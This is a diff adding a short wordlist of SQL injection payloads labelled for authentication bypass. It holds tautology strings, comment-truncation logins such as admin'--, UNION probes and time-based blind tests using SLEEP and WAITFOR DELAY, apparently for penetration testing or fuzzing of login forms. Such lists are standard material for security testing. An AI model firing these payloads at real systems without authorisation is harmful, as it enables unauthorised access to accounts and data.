@@ -1,0 +1,17 @@
+# SQL Injection payloads - auth_bypass
+' OR '1'='1
+' OR 1=1--
+' OR 'a'='a
+') OR ('1'='1
+' UNION SELECT null--
+' UNION ALL SELECT null--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '00:00:05'--
+' OR (SELECT COUNT(*) FROM information_schema.tables)>0--
+admin'--
+admin'/*
+' OR 1=1#
+' OR 1=1/*
+' OR 'x'='x
+') OR 'x'='x'--
+' OR username='admin'--
